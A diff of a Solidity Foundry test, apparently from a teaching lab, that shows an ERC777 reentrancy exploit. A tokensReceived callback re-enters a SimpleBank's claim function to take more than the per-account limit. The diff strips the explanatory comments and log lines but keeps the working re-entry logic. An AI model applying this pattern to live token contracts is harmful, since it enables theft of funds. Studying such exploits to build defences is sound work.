@@ -42,14 +42,10 @@ contract ContractTest is Test {
         MyERC777TokenContract.mint(address(SimpleBankContract), 10000, "", "");
 
         console.log(
-            "Maximum claims is 1,000 for each EOA, How can you bypass this limitation?"
-        );
-        console.log(
             "Before operation",
             MyERC777TokenContract.balanceOf(address(this))
         );
-        SimpleBankContract.claim(address(this), 900); // claim token to trigger callback function `tokensReceived()`.
-        // Expect 900 (the claim amount), but we will get the 1,900 due to reenter to claim 1,000.
+        SimpleBankContract.claim(address(this), 900);
         console.log(
             "After operation",
             MyERC777TokenContract.balanceOf(address(this))
@@ -65,8 +61,6 @@ contract ContractTest is Test {
         bytes calldata operatorData
     ) external {
         if (MyERC777TokenContract.balanceOf(address(this)) <= 1000) {
-            console.log("Reentered");
-
             SimpleBank(operator).claim(address(this), 1000);
         }
     }
